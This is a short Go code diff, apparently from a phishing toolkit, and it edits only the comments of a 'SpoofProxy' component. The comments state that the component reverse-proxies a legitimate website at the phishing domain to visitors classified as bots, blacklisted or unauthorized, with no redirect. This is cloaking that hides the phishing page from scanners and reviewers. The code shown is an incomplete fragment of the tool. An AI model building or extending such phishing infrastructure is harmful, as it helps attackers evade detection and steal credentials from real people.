@@ -6,9 +6,8 @@ import (
 	"net/url"
 )
 
-// SpoofProxy transparently reverse-proxies a configured legitimate website.
-// Used when a connection is classified as bot, blacklisted, or unauthorized.
-// The visitor sees the spoofed site's content at the phishing domain with no redirect.
+// SpoofProxy reverse-proxies a legitimate site at the phishing domain.
+// Used for blocked/bot connections — the visitor sees real content with no redirect.
 type SpoofProxy struct {
 	defaultTarget *url.URL
 	rp            *httputil.ReverseProxy
@@ -29,7 +28,6 @@ func NewSpoofProxy(defaultSpoofURL string) *SpoofProxy {
 	return &SpoofProxy{defaultTarget: target, rp: rp}
 }
 
-// ServeHTTP serves the spoof response using the default configured target.
 func (s *SpoofProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	if s.rp == nil {
 		w.WriteHeader(http.StatusOK)
